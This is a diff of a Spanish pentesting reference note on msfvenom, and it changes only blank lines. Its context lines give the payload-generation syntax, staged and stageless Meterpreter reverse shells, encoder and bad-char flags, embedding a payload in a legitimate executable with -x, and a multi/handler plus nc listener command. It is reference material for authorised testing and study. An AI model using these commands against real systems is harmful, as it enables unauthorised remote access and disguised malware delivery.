@@ -20,11 +20,9 @@ tags:
 `ATACANTE`/`PUERTO` = `LHOST`/`LPORT` de tu handler. Sin datos de objetivo real.
 
 ## Forma general
-
 ```sh
 msfvenom -p <payload> LHOST=ATACANTE LPORT=PUERTO -f <formato> -o <salida>
 ```
-
 `-p` payload · `-f` formato de salida · `-o` archivo · `-e` encoder · `-i` iteraciones · `-b` bad chars · `-a`/`--platform` arquitectura y plataforma · `msfvenom -l payloads` los lista.
 
 ## Staged vs stageless — se lee en el nombre
@@ -65,8 +63,8 @@ El payload PHP/JSP hay que envolverlo con `<?php ... ?>` o guardarlo como espera
 | Sesión Meterpreter | `.../meterpreter/...` | Pivot, `hashdump`, migración, transferencia |
 | Sin conexión saliente (bind) | `.../meterpreter/bind_tcp` | El objetivo escucha — ver [[Shell - conexión bind]] |
 
-## Encoders y bad chars
 
+## Encoders y bad chars
 > [!warning] El encoder NO evade EDR moderno
 > `shikata_ga_nai` y compañía ofuscan bytes, no comportamiento; están firmados hace años. Se usan para **excluir bad chars** en explotación de memoria, no para sigilo. Para evadir de verdad hace falta otra cosa (fuera del alcance de esta matriz).
 
@@ -76,12 +74,11 @@ El payload PHP/JSP hay que envolverlo con `<?php ... ?>` o guardarlo como espera
 | Encoder + iteraciones | `-e` `-i` | `-e x86/shikata_ga_nai -i 5` |
 | Plantilla legítima (binario real) | `-x` | `-x plantilla.exe -k` (`-k` mantiene el original funcionando) |
 
-## Atrapar la sesión — multi/handler
 
+## Atrapar la sesión — multi/handler
 ```sh
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ATACANTE; set LPORT PUERTO; set ExitOnSession false; exploit -j"
 ```
-
 `PAYLOAD`, `LHOST` y `LPORT` deben coincidir **exactos** con los de msfvenom. `exploit -j` lo deja en segundo plano (`-j` = job); `sessions -i N` entra a la sesión N. Para una shell simple (no Meterpreter), un `nc -lvnp PUERTO` alcanza — ver [[Reverse y bind shells - matriz de referencia]] § listeners.
 
 ## Errores frecuentes
@@ -93,3 +90,4 @@ msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter
 | Staged no completa la sesión | la 2ª conexión (etapa) no vuelve | usar el stageless (`_`) |
 | Shellcode se corta | bad char sin excluir | agregarlo a `-b` |
 | AV lo borra al escribir | payload/encoder firmado | es esperable — ver el aviso; entrega en memoria o evasión real |
+
